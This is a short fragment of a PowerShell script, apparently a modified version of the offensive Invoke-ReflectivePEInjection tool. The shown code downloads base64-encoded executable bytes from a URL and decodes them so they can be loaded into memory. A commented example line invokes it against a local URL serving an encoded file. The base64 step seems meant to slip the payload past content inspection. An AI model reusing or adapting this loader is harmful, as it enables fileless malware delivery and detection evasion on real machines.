...
Function Main
{
	...
	{
		#modified to handle data base64 encoded
		$WebClient = New-Object System.Net.WebClient
		[Byte[]]$B64PEBytes = $WebClient.DownloadData($PEUrl)
		#[Byte[]]$PEBytes = $WebClient.DownloadData($PEUrl)
		$B64PEString = [System.Text.Encoding]::UNICODE.GetString($B64PEBytes)
		[Byte[]]$PEBytes = [System.Convert]::FromBase64String($B64PEString)
	}
...
#Invoke-ReflectivePEInjection -PEUrl http://127.0.0.1/files/enc3.txt